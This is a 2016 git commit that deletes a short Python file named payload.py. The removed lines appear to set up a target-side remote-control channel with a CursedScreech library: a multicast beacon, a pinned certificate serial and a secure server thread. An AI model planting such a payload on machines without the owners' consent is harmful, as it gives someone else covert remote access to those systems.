f4f5fe9ca069d6023ac734701cdf021fdd2f84e0
Nick <livingxsacrifice@gmail.com>
2016-03-03 14:24:23 -0500

    Delete payload.py

--- includes/api/python/payload.py
+++
@@ -1,6 +0,0 @@
-from CursedScreech import CursedScreech
-
-cs = CursedScreech("Network Client")
-cs.startMulticaster("231.253.78.30", 19579)
-cs.setRemoteCertificateSerial("ABADBA8FB7042269")
-cs.startSecureServerThread("Target.pem", "Target.cer", "Kuro.cer")
